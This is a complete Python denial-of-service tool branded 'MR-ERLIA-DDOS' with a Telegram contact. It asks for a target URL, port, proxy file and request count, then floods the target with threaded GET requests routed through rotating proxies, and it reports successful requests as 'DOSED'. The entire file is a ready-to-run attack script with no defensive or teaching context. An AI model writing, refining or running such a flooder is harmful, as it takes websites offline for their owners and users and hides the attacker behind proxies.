# MR-ERLIA-DDOS
import requests
import threading
from urllib.parse import urlparse
from time import sleep
from colorama import init

init(autoreset=True)

class Color:
    AC = '\033[96m'
    GREEN = '\033[92m'
    OGH = '\033[91m'
    kosi = '\033[93m'
    kir = '\033[1m'
    AMIRMICE = '\033[0m'
    PROXY = '\033[35m'
    STATS = '\033[33m'

def show_banner():
    print(f"""
    {Color.OGH}{Color.kir}
            . . . . . . . . . . AMIR MICE . . . . . . . . . .
    {Color.AMIRMICE}
    {Color.kosi}                ➖➖➖ TELEGRAM: @DARK_MICE ➖➖➖{Color.AMIRMICE}
    """)

def build_target_url(original_url, port):
    parsed = urlparse(original_url)
    new_netloc = f"{parsed.hostname}:{port}"
    return parsed._replace(netloc=new_netloc).geturl()

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        raise ValueError("URL must start with http:// or https://")

def load_proxies(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return None

def get_input(prompt, validation_func, error_msg, optional=False):
    while True:
        try:
            value = input(prompt).strip()
            if optional and not value:
                return None
            validation_func(value)
            return value
        except ValueError as e:
            print(f"{Color.OGH}[!] {error_msg}: {e}{Color.AMIRMICE}")

class AttackStats:
    def __init__(self):
        self.success = 0
        self.errors = 0
        self.proxy_errors = 0
        self.total = 0

    def print_stats(self):
        print(f"\n{Color.STATS}╔{'═'*50}╗")
        print(f"║ {Color.kir}ATTACK STATISTICS{Color.AMIRMICE}{' '*32}║")
        print(f"╠{'═'*50}╣")
        print(f"║ {Color.GREEN}Successful requests: {self.success}/{self.total}{' '*25}║")
        print(f"║ {Color.OGH}Failed requests: {self.errors}{' '*35}║")
        print(f"║ {Color.PROXY}Proxy errors: {self.proxy_errors}{' '*37}║")
        print(f"╚{'═'*50}╝{Color.AMIRMICE}")

def send_request(target_url, proxy, stats):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(target_url, proxies=proxies, timeout=10)
        stats.total += 1
        if response.status_code == 200:
            stats.success += 1
            status_color = Color.GREEN
            status_text = "DOSED"
        else:
            stats.errors += 1
            status_color = Color.OGH
            status_text = "FAILED"
        
        proxy_info = f"{Color.PROXY}via {proxy}{Color.AMIRMICE}" if proxy else ""
        print(f"{Color.AC}[{stats.total}] {status_color}{status_text} ➔ {target_url} {proxy_info}")
    except requests.exceptions.ProxyError:
        stats.proxy_errors += 1
        print(f"{Color.AC}[{stats.total}] {Color.PROXY}Proxy Error ➔ {proxy}{Color.AMIRMICE}")
    except Exception as e:
        stats.errors += 1
        print(f"{Color.AC}[{stats.total}] {Color.OGH}Error: {str(e)}{Color.AMIRMICE}")

def send_requests():
    show_banner()
    stats = AttackStats()

    
    url = get_input(
        f"{Color.kosi}[?] Enter the target URL (http/https): {Color.AMIRMICE}",
        validate_url,
        "Invalid URL"
    )

    port = int(get_input(
        f"{Color.kosi}[?] Enter the target port: {Color.AMIRMICE}",
        lambda x: 1 <= int(x) <= 65535,
        "Port must be between 1-65535"
    ))

    proxy_file = get_input(
        f"{Color.kosi}[?] Enter proxy file (.TXT) [Optional]: {Color.AMIRMICE}",
        lambda x: None,
        "",
        optional=True
    )

    num_requests = int(get_input(
        f"{Color.kosi}[?] Number of requests: {Color.AMIRMICE}",
        lambda x: int(x) > 0,
        "Must be positive integer"
    ))

    
    proxies = []
    if proxy_file:
        proxies = load_proxies(proxy_file) or []
        if proxies:
            print(f"{Color.PROXY}Loaded {len(proxies)} proxies!{Color.AMIRMICE}")
        else:
            print(f"{Color.OGH}No proxies loaded! Using direct connection{Color.AMIRMICE}")

    
    try:
        target_url = build_target_url(url, port)
        print(f"\n{Color.GREEN}[+] Target URL: {target_url}{Color.AMIRMICE}")
    except Exception as e:
        print(f"{Color.OGH}[!] Error: {e}{Color.AMIRMICE}")
        return

    
    print(f"\n{Color.AC}╔{'═'*50}╗")
    print(f"║ {Color.kir}Attack Confirmation{Color.AMIRMICE}{' '*30}║")
    print(f"╚{'═'*50}╝{Color.AMIRMICE}")
    
    confirm = input(
        f"{Color.kosi}[?] Launch {num_requests} requests to {target_url}? (y/n): {Color.AMIRMICE}"
    ).lower()

    if confirm != 'y':
        print(f"{Color.OGH}[!] Attack aborted!{Color.AMIRMICE}")
        return

    
    print(f"\n{Color.GREEN}[+] Initializing attack...{Color.AMIRMICE}\n")
    
    threads = []
    for i in range(num_requests):
        proxy = proxies[i % len(proxies)] if proxies else None
        thread = threading.Thread(target=send_request, args=(target_url, proxy, stats))
        threads.append(thread)
        thread.start()
        sleep(0.001)

    for thread in threads:
        thread.join()

    
    stats.print_stats()
    print(f"\n{Color.kir}{Color.GREEN}[✔] Operation completed!{Color.AMIRMICE}")

if __name__ == "__main__":
    send_requests()
